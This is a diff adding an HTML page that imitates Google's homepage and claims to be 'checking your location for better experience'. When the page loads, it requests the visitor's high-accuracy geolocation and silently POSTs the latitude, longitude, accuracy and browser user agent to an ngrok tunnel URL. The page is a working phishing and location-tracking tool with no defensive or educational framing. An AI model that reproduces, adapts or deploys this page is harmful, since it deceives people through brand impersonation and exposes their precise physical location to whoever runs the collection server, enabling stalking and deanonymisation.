@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 15%;
+            background-color: #fff;
+        }
+
+        .logo {
+            font-size: 50px;
+            font-weight: bold;
+            letter-spacing: -2px;
+        }
+
+        .logo span:nth-child(1) { color: #4285F4; }
+        .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; }
+        .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; }
+        .logo span:nth-child(6) { color: #EA4335; }
+
+        .box {
+            margin-top: 30px;
+        }
+
+        .status {
+            margin-top: 20px;
+            color: #555;
+        }
+
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            border: none;
+            background-color: #4285F4;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="logo">
+    <span>G</span><span>o</span><span>o</span>
+    <span>g</span><span>l</span><span>e</span>
+</div>
+
+<div class="box">
+    <p>Checking your location for better experience...</p>
+</div>
+
+<div class="status" id="status">
+    Verifying...
+</div>
+
+<button onclick="requestLocation()">Continue</button>
+
+<script>
+window.onload = function () {
+    requestLocation();
+};
+
+function requestLocation() {
+    if (!navigator.geolocation) {
+        document.getElementById("status").innerText = "Geolocation not supported";
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        sendPosition,
+        handleError,
+        {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        }
+    );
+}
+
+function sendPosition(position) {
+    fetch("https://saxicolous-claud-unremittingly.ngrok-free.dev/location", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            user_agent: navigator.userAgent
+        })
+    })
+    .then(() => {
+        document.getElementById("status").innerText = "Location verified ✅";
+    })
+    .catch(() => {
+        document.getElementById("status").innerText = "Error sending data";
+    });
+}
+
+function handleError() {
+    document.getElementById("status").innerText = "Please allow location access";
+}
+</script>
+
+</body>
+</html>
